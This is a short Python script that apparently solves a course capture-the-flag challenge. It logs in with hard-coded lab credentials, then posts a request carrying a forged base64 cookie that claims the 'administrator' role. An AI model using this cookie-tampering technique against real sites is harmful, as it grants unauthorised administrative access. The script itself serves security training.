import requests, sys

loginpayload = {"login": "alexrose" , "pwd":"asdfqwerzxcv" }

session = requests.Session()

url = "http://cs495.oregonctf.org/login"

response = session.post(url, data=loginpayload)

targetUrl = "http://cs495.oregonctf.org/challenges/f5ddc0ed2d30e597ebacf5fdd117083674b19bb92ffc3499121b9e6a12c92959"

postData = {"subEmail":"zoidberg22@shepherd.com"}
cookieData = {"checksum":"dXNlclJvbGU9YWRtaW5pc3RyYXRvcg=="}
response2 = session.post(targetUrl, data=postData, cookies=cookieData)
print(response2.text)
